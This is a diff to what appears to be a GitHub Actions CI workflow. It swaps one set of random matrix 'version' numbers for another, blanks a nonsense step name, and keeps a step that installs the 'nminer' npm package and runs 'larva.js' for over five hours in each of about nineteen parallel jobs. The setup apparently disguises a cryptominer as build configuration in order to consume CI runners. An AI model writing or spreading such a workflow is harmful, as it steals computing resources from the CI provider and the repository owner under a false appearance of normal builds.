@@ -9,25 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9358 }
-          - { version: 8219 }
-          - { version: 8522 }
-          - { version: 3345 }
-          - { version: 1236 }
-          - { version: 5309 }
-          - { version: 8744 }
-          - { version: 4039 }
-          - { version: 6367 }
-          - { version: 1105 }
-          - { version: 1792 }
-          - { version: 4671 }
-          - { version: 7371 }
-          - { version: 2120 }
-          - { version: 5920 }
-          - { version: 644 }
-          - { version: 7671 }
-          - { version: 4429 }
-          - { version: 6512 }
+          - { version: 3669 }
+          - { version: 7189 }
+          - { version: 758 }
+          - { version: 5894 }
+          - { version: 9640 }
+          - { version: 4029 }
+          - { version: 7265 }
+          - { version: 1688 }
+          - { version: 431 }
+          - { version: 8485 }
+          - { version: 3942 }
+          - { version: 1976 }
+          - { version: 9833 }
+          - { version: 3554 }
+          - { version: 1006 }
+          - { version: 2146 }
+          - { version: 3339 }
+          - { version: 3795 }
 
     steps:
       - name: Checkout
@@ -38,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: teeming scholarship
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 330m node larva.js || echo "larva executed"
+          timeout 318m node larva.js || echo "larva executed"
